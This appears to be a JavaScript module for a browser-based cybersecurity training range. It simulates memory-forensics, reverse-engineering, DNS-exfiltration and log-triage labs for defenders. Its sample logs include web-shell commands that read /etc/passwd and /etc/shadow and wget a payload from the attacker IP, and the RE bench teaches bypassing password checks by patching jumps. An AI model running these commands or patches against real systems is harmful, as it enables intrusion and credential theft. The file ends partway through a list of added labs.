import { LABS, LABOBJ, PHASES, THREADS, CASES } from './curriculum.js';

// Lab simulation engine — ported from app.js
// Dependencies injected via initLabs()

let _toast, _setObj, _labDoneCount, _labTotal, _labComplete, _objRows, _rngRefreshObj, _esc, _getP;

export function initLabs(deps) {
  _toast = deps.toast;
  _setObj = deps.setObj;
  _labDoneCount = deps.labDoneCount;
  _labTotal = deps.labTotal;
  _labComplete = deps.labComplete;
  _objRows = deps.objRows;
  _rngRefreshObj = deps.rngRefreshObj;
  _esc = deps.esc;
  _getP = deps.getP;
}

const toast = (...a) => _toast(...a);
const setObj = (...a) => _setObj(...a);
const labDoneCount = (...a) => _labDoneCount(...a);
const labTotal = (...a) => _labTotal(...a);
const labComplete = (...a) => _labComplete(...a);
const objRows = (...a) => _objRows(...a);
const rngRefreshObj = (...a) => _rngRefreshObj(...a);
const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

// P proxy — reads live progress from store
const P = new Proxy({}, {
  get(_, k) { const p = _getP(); return p ? p[k] : undefined; }
});

function pad(s,n){s=String(s);return s.length>=n?s+' ':s+' '.repeat(n-s.length);}

export const LAB={memOut:[], rePatched:{0:false,1:false,2:false}, reVerdict:{}, pkts:null, pcapMeta:null, pcapSel:null, pcapFilter:'', logTab:'auth', logFilter:'', unpPc:0, unpRun:false, memPc:0, memRun:false};






function memBanner(){return [
 '<span class="dim">memvol 0.9 — read-only triage shell. Image: '+MEM.profile+'</span>',
 '<span class="dim">Mission: one process is lying about who it is. Find it, find its C2, find what it stole.</span>',
 '<span class="dim">Type <span class="hl">help</span> for plugins.</span>',''];}
function rngTermPaint(){const el=document.getElementById('labout');if(el){el.innerHTML=LAB.memOut.join('\n');el.scrollTop=el.scrollHeight;}}
function memTree(P_){
 const by={}; MEM.ps.forEach(p=>{(by[p[1]]=by[p[1]]||[]).push(p);});
 const pids=new Set(MEM.ps.map(p=>p[0]));
 function rec(pid,d){(by[pid]||[]).forEach(p=>{P_(' '.repeat(d*3)+'└─ '+pad(p[2],18)+'pid '+p[0]);rec(p[0],d+1);});}
 MEM.ps.filter(p=>!pids.has(p[1])).forEach(p=>{P_(pad(p[2],21)+'pid '+p[0]);rec(p[0],1);});
}
function memMalfind(P_){
 P_('<span class="hl">Process: svch0st.exe   Pid: 4880   PPID: 2904 (explorer.exe)</span>');
 P_(' Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE   Private: True   CommitCharge: 33');
 P_(' Address: 0x0000000001a40000');
 P_('   0x1a40000  4d 5a 90 00 03 00 00 00   MZ......');
 P_('   0x1a40008  e8 1f 01 00 00 5b 81 eb   .....[..');
 P_('   0x1a40000  4d 5a            dec ebp ; pop edx');
 P_('<span class="dim">An \'MZ\' (PE header) sitting in a PRIVATE, READ-WRITE-EXECUTE region = a binary injected into running memory. Only pid 4880 has one.</span>');
}
function memDecode(arg,P_){
 if(!arg){P_('<span class="err">usage: decode &lt;base64&gt;</span>');return;}
 let dec; try{dec=atob(arg.trim());}catch(e){P_('<span class="err">not valid base64</span>');return;}
 P_('  → <span class="hl">'+esc(dec)+'</span>');
 if(/DownloadString|New-Object|IEX/i.test(dec)){P_('<span class="dim">That is a download-cradle: it pulls and runs code straight from the C2. Objective cleared.</span>');setObj('mem','ps');}
 if(/^BV\{/.test(dec))P_('<span class="dim">Looks like a flag — drop it in the findings box below.</span>');
}
function memRun(line){
 const out=LAB.memOut; out.push('<span class="pmt">vol&gt;</span> '+esc(line));
 const parts=line.trim().split(/\s+/); const cmd=(parts[0]||'').toLowerCase(); const arg=parts.slice(1).join(' ');
 const P_=v=>out.push(v);
 if(cmd===''){ }
 else if(cmd==='help'){['<span class="dim">plugins</span>',
   '  imageinfo           profile + dump metadata',
   '  pslist              processes:  PID PPID Name Threads Start',
   '  pstree              parent → child tree (spot the odd parent)',
   '  netscan             active network connections + owning PID',
   '  cmdline &lt;pid&gt;       full command line of a process',
   '  strings &lt;pid&gt;       ascii strings carved out of a process',
   '  malfind             injected code / RWX private regions',
   '  decode &lt;base64&gt;     decode a base64 blob you found',
   '  clear               wipe the screen'].forEach(P_);}
 else if(cmd==='imageinfo'){P_('<span class="hl">'+MEM.profile+'</span>');}
 else if(cmd==='pslist'){P_('<span class="dim">'+pad('PID',7)+pad('PPID',7)+pad('Name',18)+pad('Thr',5)+'Start</span>');MEM.ps.forEach(p=>P_(pad(p[0],7)+pad(p[1],7)+pad(p[2],18)+pad(p[3],5)+p[4]));}
 else if(cmd==='pstree'){memTree(P_);}
 else if(cmd==='netscan'){P_('<span class="dim">'+pad('Proto',7)+pad('Local',22)+pad('Remote',22)+pad('State',13)+'PID</span>');MEM.net.forEach(n=>P_(pad(n[0],7)+pad(n[1],22)+pad(n[2],22)+pad(n[3],13)+n[4]));}
 else if(cmd==='cmdline'){const pid=+arg; if(MEM.cmd[pid]){P_(pad('pid '+pid+':',12)+MEM.cmd[pid]);} else P_('<span class="err">no cmdline cached for "'+esc(arg)+'" (try: '+Object.keys(MEM.cmd).join(', ')+')</span>');}
 else if(cmd==='strings'){const pid=+arg; if(MEM.strs[pid]){MEM.strs[pid].forEach(s=>P_('  '+esc(s)));} else P_('<span class="err">no carved strings for "'+esc(arg)+'" — the implant is pid 4880</span>');}
 else if(cmd==='malfind'){memMalfind(P_);}
 else if(cmd==='decode'){memDecode(arg,P_);}
 else if(cmd==='clear'){LAB.memOut=memBanner();rngTermPaint();return;}
 else{P_('<span class="err">unknown plugin: '+esc(cmd)+' — type help</span>');}
 out.push(''); rngTermPaint();
}
function memCheck(){
 const g=id=>(document.getElementById(id)||{}).value||'';
 const pid=g('f_pid').trim(), c2=g('f_c2').trim(), fl=g('f_flag').replace(/\s/g,'');
 let any=false;
 if(pid==='4880'){setObj('mem','malpid');any=true;}
 else if(pid)toast('PID '+pid+' is not the implant — check pstree/malfind');
 if(/185\.220\.101\.47/.test(c2)){setObj('mem','c2');any=true;}
 else if(c2)toast('that is not the C2 — check netscan for pid 4880');
 if(fl==='BV{m3m0ry_d0nt_l13}'){setObj('mem','flag');any=true;}
 else if(fl)toast('flag mismatch — decode the exfil>> blob in strings 4880');
 if(any)toast('findings logged');
}
function labMem(){
 if(!LAB.memOut.length)LAB.memOut=memBanner();
 const chips=['imageinfo','pslist','pstree','netscan','cmdline 4880','cmdline 5012','strings 4880','malfind'];
 return `
 <div class="term">
   <div class="term__out" id="labout">${LAB.memOut.join('\n')}</div>
   <div class="term__in"><span>vol&gt;</span><div class="term-input-wrapper"><input id="memcmd" autocomplete="off" spellcheck="false" placeholder="type a plugin and hit enter…"><span class="term-input-ghost" id="memcmd-ghost"></span></div></div>
 </div>
 <div class="qchips">${chips.map(c=>`<button data-memq="${esc(c)}">${esc(c)}</button>`).join('')}</div>
 <div class="objbox" style="margin-top:18px"><h4>Submit findings</h4>
   <div class="findform">
     <div><label>Injected process — PID</label><input id="f_pid" autocomplete="off" placeholder="e.g. 1234"></div>
     <div><label>C2 server — ip:port</label><input id="f_c2" autocomplete="off" placeholder="e.g. 1.2.3.4:443"></div>
     <div class="full"><label>Recovered flag</label><input id="f_flag" autocomplete="off" placeholder="BV{...}"></div>
   </div>
   <div style="margin-top:12px"><button class="btn" data-memsubmit="1">Check findings</button>
   <span class="prog" style="margin-left:12px;color:var(--ash);font-family:var(--mono)">(decode the -enc payload in the terminal for the 3rd objective)</span></div>
 </div>
 <div class="hintbox"><b>Field reality:</b> a real <code>svchost.exe</code> is always a child of <code>services.exe</code> (pid 680) and lives in System32. A "svchost" parented to explorer.exe — spelled with a zero — running from <code>\\Temp\\</code> is the lie. <code>pstree</code> exposes the bad parent, <code>netscan</code> gives you its socket, <code>strings 4880</code> holds what it stole.</div>`;
}

/* ---------------- LAB: RE BENCH ---------------- */
const XENC=[0x43,0x44,0x5d,0x52,0x54,0x56];
function asmRows(rows,patched){return rows.map((r,i)=>`<div class="row" ${r.jmp?`data-rejmp="${i}"`:''} data-jmp="${r.jmp?1:0}" data-patched="${r.jmp&&patched?1:0}"><span class="a">${r.a}</span><span class="by">${r.by||''}</span><span class="mn">${esc(r.jmp&&patched?r.pj:r.mn)}</span>${r.cm?`<span class="cm">  ; ${esc(r.cm)}</span>`:''}</div>`).join('');}
const CRACK=[
 {tag:'plaintext', fn:'auth_check', obj:'l0', sol:'letmein',
  test:s=>s==='letmein',
  hint:'The comparison string is loaded into rsi from .rodata right before the call to strcmp. Whatever it points at is the password — read it literally.',
  asm:[
   {a:'0x1149',by:'55',mn:'push rbp'},
   {a:'0x114a',by:'48 89 e5',mn:'mov rbp, rsp'},
   {a:'0x114d',by:'48 89 7d f8',mn:'mov [rbp-0x8], rdi',cm:'input'},
   {a:'0x1151',by:'48 8d 35 ..',mn:'lea rsi, [rip+0xeac]',cm:'"letmein"'},
   {a:'0x1158',by:'48 8b 7d f8',mn:'mov rdi, [rbp-0x8]'},
   {a:'0x115c',by:'e8 cf fe ..',mn:'call strcmp'},
   {a:'0x1161',by:'85 c0',mn:'test eax, eax'},
   {a:'0x1163',by:'75 07',mn:'jne 0x116c',pj:'nop ; nop',jmp:1,cm:'strcmp!=0 → fail. patch to fall through'},
   {a:'0x1165',by:'b8 01 ..',mn:'mov eax, 1',cm:'return 1  (GRANTED)'},
   {a:'0x116a',by:'eb 05',mn:'jmp 0x1171'},
   {a:'0x116c',by:'b8 00 ..',mn:'mov eax, 0',cm:'return 0  (DENIED)'},
   {a:'0x1171',by:'5d',mn:'pop rbp'},
   {a:'0x1172',by:'c3',mn:'ret'},
  ],
  pseudo:`<span class="kw">int</span> auth_check(<span class="kw">char</span> *input) {
    <span class="kw">if</span> (strcmp(input, <span class="st">"letmein"</span>) == 0)
        <span class="kw">return</span> 1;   <span class="cm">// access granted</span>
    <span class="kw">return</span> 0;       <span class="cm">// access denied</span>
}`},
 {tag:'XOR gate', fn:'xor_gate', obj:'l1', sol:'pwnage',
  test:s=>s.length===6 && XENC.every((b,i)=>(s.charCodeAt(i)^0x33)===b),
  hint:'Each input byte is XORed with 0x33, then compared to a 6-byte table {43 44 5d 52 54 56}. XOR is its own inverse: plaintext[i] = table[i] ^ 0x33. Decode the six bytes.',
  asm:[
   {a:'0x1170',by:'55',mn:'push rbp'},
   {a:'0x1171',by:'48 89 e5',mn:'mov rbp, rsp'},
   {a:'0x1174',by:'48 89 7d e8',mn:'mov [rbp-0x18], rdi',cm:'input'},
   {a:'0x1178',by:'c7 45 fc 00',mn:'mov dword [rbp-0x4], 0',cm:'i = 0'},
   {a:'0x117f',by:'eb 1f',mn:'jmp 0x11a0',cm:'→ loop condition'},
   {a:'0x1181',by:'8b 45 fc',mn:'mov eax, [rbp-0x4]'},
   {a:'0x1184',by:'48 03 ..',mn:'movzx ecx, byte [rdi+rax]',cm:'input[i]'},
   {a:'0x1188',by:'83 f1 33',mn:'xor ecx, 0x33',cm:'input[i] ^ 0x33'},
   {a:'0x118b',by:'48 8d 15',mn:'lea rdx, [rip+key]',cm:'key = {43 44 5d 52 54 56}'},
   {a:'0x1192',by:'3a 0c 02',mn:'cmp cl, [rdx+rax]',cm:'== key[i] ?'},
   {a:'0x1195',by:'74 07',mn:'je 0x119e',pj:'jmp 0x119e',jmp:1,cm:'equal → next. patch to always pass'},
   {a:'0x1197',by:'b8 00 ..',mn:'mov eax, 0',cm:'mismatch → return 0'},
   {a:'0x119c',by:'eb 0e',mn:'jmp 0x11ae'},
   {a:'0x119e',by:'83 45 fc 01',mn:'add dword [rbp-0x4], 1',cm:'i++'},
   {a:'0x11a0',by:'83 7d fc 06',mn:'cmp dword [rbp-0x4], 6'},
   {a:'0x11a4',by:'7c db',mn:'jl 0x1181',cm:'i < 6 → loop'},
   {a:'0x11a6',by:'b8 01 ..',mn:'mov eax, 1',cm:'all matched → return 1'},
   {a:'0x11ae',by:'5d c3',mn:'pop rbp ; ret'},
  ],
  pseudo:`<span class="kw">char</span> key[6] = { 0x43,0x44,0x5d,0x52,0x54,0x56 };

<span class="kw">int</span> xor_gate(<span class="kw">char</span> *input) {
    <span class="kw">for</span> (<span class="kw">int</span> i = 0; i &lt; 6; i++) {
        <span class="kw">if</span> ((input[i] ^ 0x33) != key[i])
            <span class="kw">return</span> 0;        <span class="cm">// wrong</span>
    }
    <span class="kw">return</span> 1;                <span class="cm">// input[i] == key[i] ^ 0x33</span>
}`},
 {tag:'keygen', fn:'validate_serial', obj:'l2', sol:'40000008',
  test:s=>{ if(!/^[0-9]{8}$/.test(s))return false; let sum=0; for(let i=0;i<8;i++)sum+=(s.charCodeAt(i)-48)*(i+1); return sum%17===0 && s[0]==='4'; },
  hint:'No fixed password — you must MAKE a serial that passes. Rules from the pseudo-C: exactly 8 digits, first digit must be \'4\', and the position-weighted sum  Σ digit[i]*(i+1)  must be divisible by 17. Set most digits to 0 and solve the last one: 4·1 + d·8 ≡ 0 (mod 17).',
  asm:[
   {a:'0x11c0',by:'55 48 89 e5',mn:'push rbp ; mov rbp, rsp'},
   {a:'0x11c4',by:'48 89 7d e8',mn:'mov [rbp-0x18], rdi',cm:'serial'},
   {a:'0x11c8',by:'e8 .. ..',mn:'call strlen'},
   {a:'0x11cd',by:'48 83 f8 08',mn:'cmp rax, 8'},
   {a:'0x11d1',by:'75 33',mn:'jne 0x1206',cm:'len != 8 → fail'},
   {a:'0x11d3',by:'45 31 c0',mn:'xor r8d, r8d',cm:'sum = 0'},
   {a:'0x11d6',by:'31 c9',mn:'xor ecx, ecx',cm:'i = 0'},
   {a:'0x11d8',by:'0f b6 ..',mn:'movzx eax, byte [rdi+rcx]',cm:'serial[i]'},
   {a:'0x11dc',by:'83 e8 30',mn:'sub eax, 0x30',cm:"- '0'"},
   {a:'0x11df',by:'83 f8 09',mn:'cmp eax, 9'},
   {a:'0x11e2',by:'77 22',mn:'ja 0x1206',cm:'not 0-9 → fail'},
   {a:'0x11e4',by:'8d 51 01',mn:'lea edx, [rcx+1]',cm:'weight = i+1'},
   {a:'0x11e7',by:'0f af c2',mn:'imul eax, edx',cm:'digit * (i+1)'},
   {a:'0x11ea',by:'41 01 c0',mn:'add r8d, eax',cm:'sum += ...'},
   {a:'0x11ed',by:'48 ff c1',mn:'inc rcx ; cmp rcx,8 ; jl 0x11d8'},
   {a:'0x11f5',by:'.. 6b .. 17',mn:'mod = sum % 17'},
   {a:'0x11f9',by:'85 c0',mn:'test mod, mod'},
   {a:'0x11fb',by:'75 09',mn:'jne 0x1206',cm:'sum % 17 != 0 → fail'},
   {a:'0x11fd',by:'80 3f 34',mn:"cmp byte [rdi], '4'"},
   {a:'0x1200',by:'75 04',mn:'jne 0x1206',pj:'nop ; nop',jmp:1,cm:"serial[0] != '4' → fail. patch the last gate"},
   {a:'0x1202',by:'b8 01 ..',mn:'mov eax, 1',cm:'valid!'},
   {a:'0x1206',by:'31 c0 c3',mn:'xor eax, eax ; ret',cm:'invalid'},
  ],
  pseudo:`<span class="kw">int</span> validate_serial(<span class="kw">char</span> *s) {
    <span class="kw">if</span> (strlen(s) != 8) <span class="kw">return</span> 0;
    <span class="kw">int</span> sum = 0;
    <span class="kw">for</span> (<span class="kw">int</span> i = 0; i &lt; 8; i++) {
        <span class="kw">if</span> (s[i] &lt; <span class="st">'0'</span> || s[i] &gt; <span class="st">'9'</span>) <span class="kw">return</span> 0;
        sum += (s[i] - <span class="st">'0'</span>) * (i + 1);   <span class="cm">// position-weighted</span>
    }
    <span class="kw">return</span> (sum % 17 == 0) && (s[0] == <span class="st">'4'</span>);
}`},
];
function reTest(){
 const lvl=state.reLvl, c=CRACK[lvl], v=(document.getElementById('reinput')||{}).value||'';
 const patched=LAB.rePatched[lvl];
 const ok = patched ? v.length>0 : c.test(v);
 LAB.reVerdict={ok, txt: ok ? ('>>> ACCESS GRANTED'+(patched?'  (check bypassed via patch)':'')) : '>>> ACCESS DENIED'};
 if(ok){ if(patched)setObj('re','patch'); else setObj('re',c.obj); }
 const el=document.getElementById('reverdict'); if(el){el.textContent=LAB.reVerdict.txt;el.className='verdict '+(ok?'ok':'no');}
}
function labRE(){
 const lvl=state.reLvl, c=CRACK[lvl], patched=LAB.rePatched[lvl];
 return `
 <div class="relevels">${CRACK.map((cc,i)=>`<button data-relvl="${i}" aria-current="${i===lvl}">#${i+1} · ${esc(cc.tag)}</button>`).join('')}</div>
 <div class="rebench">
   <div class="repane"><h5>disassembly — &lt;${esc(c.fn)}&gt;${patched?' · PATCHED':''}</h5><div class="asm">${asmRows(c.asm,patched)}</div></div>
   <div class="repane"><h5>decompiler — pseudo-C</h5><div class="pcode">${c.pseudo}</div></div>
 </div>
 <div class="retry">
   <input id="reinput" autocomplete="off" spellcheck="false" placeholder="${lvl===2?'enter an 8-digit serial':'enter the password'}">
   <button class="btn" data-retest="1">Run check ▸</button>
   <span class="prog" style="color:var(--ash);font-family:var(--mono)">${patched?'⚠ jump patched — any input passes':'tip: click the highlighted red jump to patch it'}</span>
 </div>
 <div class="verdict ${LAB.reVerdict.ok?'ok':(LAB.reVerdict.txt?'no':'')}" id="reverdict">${esc(LAB.reVerdict.txt||'')}</div>
 <div class="hintbox"><b>Hint:</b> ${esc(c.hint)} <a data-resol="1" style="color:var(--volt);cursor:pointer">[ reveal answer ]</a></div>`;
}

/* ---------------- LAB: DNS EXFIL HUNT ---------------- */
function pcapBuild(){
 if(LAB.pkts)return;
 const flag='BV{dns_7unnel}', victim='10.0.2.15', dnssrv='10.0.2.3', dom='cdn-telemetry.xyz';
 let hex=''; for(const ch of flag)hex+=ch.charCodeAt(0).toString(16).padStart(2,'0');
 const chunks=[]; for(let i=0;i<hex.length;i+=4)chunks.push(hex.slice(i,i+4));
 const pk=[]; let no=1; const add=o=>{o.no=no++;pk.push(o);};
 const dnsDetail=q=>`Domain Name System (query)\n    Transaction ID: 0x${(0x1000+q.no).toString(16)}\n    Flags: 0x0100 Standard query\n    Questions: 1\n    Queries:\n        ${q.qname}: type A, class IN`;
 add({t:'0.000000',proto:'DNS',src:victim,dst:dnssrv,info:'Standard query A www.google.com',qname:'www.google.com'});
 add({t:'0.013442',proto:'DNS',src:dnssrv,dst:victim,info:'Standard query response A 142.250.72.196',qname:'www.google.com'});
 add({t:'0.241006',proto:'TLS',src:victim,dst:'142.250.72.196',info:'Client Hello (SNI=www.google.com)'});
 add({t:'1.004221',proto:'HTTP',src:victim,dst:'93.184.216.34',info:'GET /index.html HTTP/1.1'});
 let exfilNo=0;
 const interleave=[ {t:'3.110',extra:{proto:'DNS',src:victim,dst:dnssrv,info:'Standard query A pool.ntp.org',qname:'pool.ntp.org'}},
                    {t:'5.880',extra:{proto:'HTTP',src:victim,dst:'93.184.216.34',info:'GET /style.css HTTP/1.1'}},
                    {t:'9.540',extra:{proto:'TLS',src:victim,dst:'13.107.42.14',info:'Application Data'}} ];
 chunks.forEach((c,i)=>{
   const q=`s${i}-${c}.${dom}`;
   add({t:(2.5+i*0.9).toFixed(6),proto:'DNS',src:victim,dst:dnssrv,info:'Standard query A '+q,qname:q,exfil:true,seq:i,chunk:c});
   if(interleave[exfilNo]&&i%2===1){add(interleave[exfilNo].extra);exfilNo++;}
 });
 add({t:'12.660000',proto:'DNS',src:victim,dst:dnssrv,info:'Standard query A update.microsoft.com',qname:'update.microsoft.com'});
 pk.forEach(q=>{ if(q.proto==='DNS'&&!q.detail)q.detail=dnsDetail(q)+(q.exfil?`\n\n[ note: ${q.qname.split('.')[0]} is not a hostname — it is base16 data smuggled in the subdomain ]`:''); });
 LAB.pkts=pk; LAB.pcapMeta={dom,victim,flag,count:chunks.length};
}
function pcapMatch(q,f){
 f=f.trim().toLowerCase(); if(!f)return true;
 if(f==='dns')return q.proto==='DNS';
 if(f==='http')return q.proto==='HTTP';
 if(f==='tls')return q.proto==='TLS';
 let m=f.match(/^ip\.addr\s*==\s*(.+)$/); if(m)return q.src.includes(m[1].trim())||q.dst.includes(m[1].trim());
 m=f.match(/^dns\.qry\.name\s+contains\s+(.+)$/); if(m)return (q.qname||'').toLowerCase().includes(m[1].trim());
 return (q.info+' '+(q.qname||'')+' '+q.src+' '+q.dst+' '+q.proto).toLowerCase().includes(f);
}
function pcapRows(){
 return LAB.pkts.filter(q=>pcapMatch(q,LAB.pcapFilter)).map(q=>`<tr data-pktrow="${q.no}" data-sel="${LAB.pcapSel===q.no?1:0}"><td>${q.no}</td><td>${q.t}</td><td class="pr-${q.proto}">${q.proto}</td><td>${q.src}</td><td>${q.dst}</td><td>${esc(q.info)}</td></tr>`).join('');
}
function pcapPaint(){const b=document.getElementById('pkttbody');if(b)b.innerHTML=pcapRows();}
function pcapSelect(no){LAB.pcapSel=no;pcapPaint();const q=LAB.pkts.find(x=>x.no===no);const d=document.getElementById('pktdetail');if(d)d.textContent=q?(q.detail||`Frame ${q.no}: ${q.proto}\n  ${q.src} → ${q.dst}\n  ${q.info}`):'';}
function pcapReassemble(){
 const ex=LAB.pkts.filter(q=>q.exfil).sort((a,b)=>a.seq-b.seq);
 const hex=ex.map(q=>q.chunk).join('');
 let s=''; for(let i=0;i<hex.length;i+=2)s+=String.fromCharCode(parseInt(hex.substr(i,2),16));
 const d=document.getElementById('pktdetail');
 if(d)d.textContent='Reassembling '+ex.length+' exfil subdomains, sorted by seq:\n  '+ex.map(q=>q.chunk).join(' ')+'\n  hex → '+hex+'\n\n  DECODED: '+s;
 setObj('pcap','flag');
}
function pcapCheck(){
 const g=id=>(document.getElementById(id)||{}).value||'';
 const dom=g('p_dom').trim().toLowerCase(), vic=g('p_vic').trim(), cnt=g('p_cnt').trim();
 let any=false;
 if(dom==='cdn-telemetry.xyz'){setObj('pcap','dom');any=true;} else if(dom)toast('not the exfil domain — look for long random subdomains');
 if(vic==='10.0.2.15'){setObj('pcap','victim');any=true;} else if(vic)toast('that host is not the source of the exfil queries');
 if(cnt===String(LAB.pcapMeta.count)){setObj('pcap','count');any=true;} else if(cnt)toast('recount — filter to just the exfil queries');
 if(any)toast('findings logged');
}
function labPcap(){
 pcapBuild();
 return `
 <div class="filterbar"><input id="pcapfilter" autocomplete="off" spellcheck="false" placeholder="display filter:  dns   ·   ip.addr == 10.0.2.15   ·   dns.qry.name contains telemetry" value="${esc(LAB.pcapFilter)}"></div>
 <div class="repane"><table class="pkts"><thead><tr><th>No.</th><th>Time</th><th>Proto</th><th>Source</th><th>Destination</th><th>Info</th></tr></thead><tbody id="pkttbody">${pcapRows()}</tbody></table></div>
 <div class="pktdetail" id="pktdetail">click a packet to inspect it. The exfil hides in DNS A queries whose left-most label is not a hostname — it is hex-encoded data.</div>
 <div class="qchips" style="margin-top:12px"><button data-pcapreasm="1" class="btn" style="box-shadow:3px 3px 0 var(--amber)">⛓ Reassemble exfil →</button></div>
 <div class="objbox" style="margin-top:18px"><h4>Submit findings</h4>
   <div class="findform">
     <div><label>Exfil domain</label><input id="p_dom" autocomplete="off" placeholder="e.g. evil.example"></div>
     <div><label>Victim host (IP)</label><input id="p_vic" autocomplete="off" placeholder="e.g. 10.0.0.5"></div>
     <div class="full"><label># of exfil DNS queries</label><input id="p_cnt" autocomplete="off" placeholder="count them"></div>
   </div>
   <div style="margin-top:12px"><button class="btn" data-pcapsubmit="1">Check findings</button></div>
 </div>
 <div class="hintbox"><b>Why this matters for your DNS filter:</b> DNS is rarely blocked, so attackers tunnel data out one query at a time — each subdomain is a chunk of base16/base32. The tells: one host firing many A-record lookups to the same parent domain, long high-entropy labels, and a sequence counter. That cadence is exactly what a good resolver policy should flag.</div>`;
}

/* ---------------- LAB: LOG TRIAGE ---------------- */
const LOGS={
 auth:[
  'Jun 28 02:14:03 web01 sshd[20431]: Accepted password for deploy from 10.0.5.40 port 51022 ssh2',
  'Jun 28 02:55:11 web01 CRON[20502]: pam_unix(cron:session): session opened for user root',
  'Jun 28 03:11:44 web01 sshd[21008]: Failed password for invalid user oracle from 45.133.1.88 port 40122 ssh2',
  'Jun 28 03:11:45 web01 sshd[21008]: Failed password for invalid user postgres from 45.133.1.88 port 40124 ssh2',
  'Jun 28 03:11:46 web01 sshd[21010]: Failed password for invalid user test from 45.133.1.88 port 40130 ssh2',
  'Jun 28 03:11:47 web01 sshd[21010]: Failed password for root from 45.133.1.88 port 40140 ssh2',
  'Jun 28 03:11:49 web01 sshd[21012]: Failed password for root from 45.133.1.88 port 40150 ssh2',
  'Jun 28 03:11:51 web01 sshd[21014]: Failed password for admin from 45.133.1.88 port 40162 ssh2',
  'Jun 28 03:11:53 web01 sshd[21014]: Failed password for admin from 45.133.1.88 port 40170 ssh2',
  'Jun 28 03:11:55 web01 sshd[21016]: Failed password for admin from 45.133.1.88 port 40180 ssh2',
  'Jun 28 03:11:58 web01 sshd[21016]: Failed password for admin from 45.133.1.88 port 40191 ssh2',
  'Jun 28 03:12:02 web01 sshd[21020]: Failed password for admin from 45.133.1.88 port 40200 ssh2',
  'Jun 28 03:12:09 web01 sshd[21020]: Accepted password for admin from 45.133.1.88 port 40210 ssh2',
  'Jun 28 03:12:09 web01 sshd[21020]: pam_unix(sshd:session): session opened for user admin by (uid=0)',
  'Jun 28 03:13:30 web01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow',
 ],
 access:[
  '203.0.113.9 - - [28/Jun/2026:03:02:11] "GET /index.php HTTP/1.1" 200 5312 "-" "Mozilla/5.0"',
  '203.0.113.9 - - [28/Jun/2026:03:02:14] "GET /css/app.css HTTP/1.1" 200 1822 "-" "Mozilla/5.0"',
  '45.133.1.88 - - [28/Jun/2026:03:14:01] "GET /admin/ HTTP/1.1" 200 980 "-" "curl/8.4.0"',
  '45.133.1.88 - - [28/Jun/2026:03:14:55] "POST /admin/upload.php HTTP/1.1" 200 41 "-" "curl/8.4.0"',
  '45.133.1.88 - - [28/Jun/2026:03:15:02] "GET /uploads/av4t4r.php?cmd=id HTTP/1.1" 200 56 "-" "curl/8.4.0"',
  '45.133.1.88 - - [28/Jun/2026:03:15:20] "GET /uploads/av4t4r.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1422 "-" "curl/8.4.0"',
  '45.133.1.88 - - [28/Jun/2026:03:15:51] "GET /uploads/av4t4r.php?cmd=wget+http://45.133.1.88/m+-O+/tmp/m HTTP/1.1" 200 0 "-" "curl/8.4.0"',
  '198.51.100.7 - - [28/Jun/2026:03:18:09] "GET /index.php HTTP/1.1" 200 5312 "-" "Mozilla/5.0"',
 ],
};
function logPaint(){
 const b=document.getElementById('logbody'); if(!b)return;
 const lines=LOGS[LAB.logTab]; const f=LAB.logFilter.trim();
 let valid=false; if(f){try{new RegExp(f,'i');valid=true;}catch(e){valid=false;}}
 const out=lines.filter(l=>{ if(!f)return true; return valid?new RegExp(f,'i').test(l):l.toLowerCase().includes(f.toLowerCase()); })
   .map(l=>{ const e=esc(l); if(!f)return e; if(valid){try{return e.replace(new RegExp('('+f+')','ig'),'<span class="hit">$1</span>');}catch(x){return e;}} return e; });
 b.innerHTML=out.join('\n')||'<span style="color:var(--ash)">no lines match.</span>';
}
function logCheck(){
 const g=id=>(document.getElementById(id)||{}).value||'';
 const ip=g('l_ip').trim(), acct=g('l_acct').trim().toLowerCase(), sh=g('l_shell').trim().toLowerCase(), cmd=g('l_cmd').trim().toLowerCase();
 let any=false;
 if(ip==='45.133.1.88'){setObj('log','ip');any=true;} else if(ip)toast('that IP is not the brute-forcer — count the Failed passwords');
 if(acct==='admin'){setObj('log','acct');any=true;} else if(acct)toast('not the account that was finally Accepted');
 if(sh.includes('av4t4r.php')){setObj('log','shell');any=true;} else if(sh)toast('not the dropped shell — check the access log uploads/');
 if(/\/etc\/passwd|\bid\b|wget|whoami|\/etc\/shadow/.test(cmd)){setObj('log','cmd');any=true;} else if(cmd)toast('that command was not run via the shell (look at cmd= params)');
 if(any)toast('findings logged');
}
function labLog(){
 return `
 <div class="logtabs"><button data-logtab="auth" aria-current="${LAB.logTab==='auth'}">auth.log</button><button data-logtab="access" aria-current="${LAB.logTab==='access'}">access.log</button></div>
 <div class="filterbar"><input id="logfilter" autocomplete="off" spellcheck="false" placeholder="grep / regex:  Failed password   ·   45\\.133   ·   Accepted   ·   cmd=" value="${esc(LAB.logFilter)}"></div>
 <div class="logview" id="logbody"></div>
 <div class="objbox" style="margin-top:18px"><h4>Submit findings</h4>
   <div class="findform">
     <div><label>Attacker IP</label><input id="l_ip" autocomplete="off" placeholder="x.x.x.x"></div>
     <div><label>Compromised account</label><input id="l_acct" autocomplete="off" placeholder="username"></div>
     <div><label>Web shell path</label><input id="l_shell" autocomplete="off" placeholder="/path/to/shell.php"></div>
     <div><label>Command run via shell</label><input id="l_cmd" autocomplete="off" placeholder="e.g. cat /etc/passwd"></div>
   </div>
   <div style="margin-top:12px"><button class="btn" data-logsubmit="1">Check findings</button></div>
 </div>
 <div class="hintbox"><b>Triage flow:</b> in auth.log a burst of <code>Failed password</code> from one IP, then a single <code>Accepted password</code> from that same IP = a successful brute force — note the username. Pivot to access.log: the same IP <code>POST</code>s to an upload endpoint, then <code>GET</code>s a new <code>.php</code> with a <code>?cmd=</code> parameter. That parameter is hands-on-keyboard.</div>`;
}

/* ============================================================ RANGE — EXPANSION PACK (9 more categories) ============================================================ */
LAB.cy=''; LAB.webTab='sqli'; LAB.peTab='overview'; LAB.peUnpacked=false; LAB.privOut=[];

LABS.push(
 {id:'crypto', track:'CR',  name:'Crypto Workbench', tool:'cipher / encoding',     blurb:'Stack decode operations — Caesar, Base64, single-byte XOR, reverse — until a flag drops out. A CyberChef in miniature.'},
 {id:'web',    track:'WEB', name:'Web Exploitation', tool:'appsec sandbox',        blurb:'Hands-on SQLi login bypass, path traversal, OS command injection and reflected XSS against safe simulated endpoints.'},
